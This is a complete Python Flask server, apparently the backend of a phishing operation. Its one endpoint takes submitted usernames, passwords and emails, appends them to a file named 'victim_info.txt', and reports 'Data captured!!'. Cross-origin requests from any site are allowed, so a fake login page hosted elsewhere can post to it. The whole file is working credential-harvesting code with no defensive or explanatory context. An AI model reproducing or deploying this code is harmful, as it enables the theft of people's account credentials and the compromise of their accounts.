from pathlib import Path

from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

DATA_FILE = Path(__file__).parent / "victim_info.txt"


@app.route('/savefile', methods=['POST'])
def save_file():
    data = request.get_json(silent=True) or {}

    user = data.get('username')
    password = data.get('password')
    email = data.get('email', "")

    if not user or not password:
        return jsonify(status="Error", message="Username and password are required"), 400

    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    with DATA_FILE.open("a+") as file:
        file.write(f'{user}, {password}, {email}\n')

    print("Data captured!!")

    return jsonify(status="OK"), 200


if __name__ == '__main__':
    app.run(host="localhost", port=2400, debug=True)
